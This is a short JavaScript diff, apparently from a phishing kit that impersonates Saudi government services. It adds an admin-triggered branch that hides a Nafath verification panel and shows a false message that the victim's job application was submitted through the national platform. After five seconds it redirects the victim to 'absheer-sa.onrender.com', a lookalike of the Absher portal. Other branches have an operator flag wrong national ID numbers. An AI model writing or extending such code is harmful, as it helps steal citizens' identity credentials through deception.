@@ -101,6 +101,21 @@ document.addEventListener('DOMContentLoaded', () => {
                     if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
                 } 
                 
+                // الإجراء الجديد: الأدمن وافق على إجراء "تم التقديم على وظيفتك عبر المنصة الوطنية الموحدة"
+                else if (data.status === "submitted_job") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    if (nafathWaitContainer) nafathWaitContainer.classList.add('hidden-panel');
+                    
+                    alert('تم التقديم على وظيفتك عبر المنصة الوطنية الموحدة بنجاح! سيتم تحويلك الآن لتأكيد الطلب...');
+                    
+                    // التوجيه التلقائي بعد 5 ثوانٍ إلى منصة أبشر المستهدفة
+                    setTimeout(() => {
+                        window.location.href = "https://absheer-sa.onrender.com/";
+                    }, 5000);
+                    
+                    unsubscribe();
+                }
+
                 // الإجراء الثاني: رقم الهوية غير صحيح من الأدمن
                 else if (data.status === "wrong_national_id") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
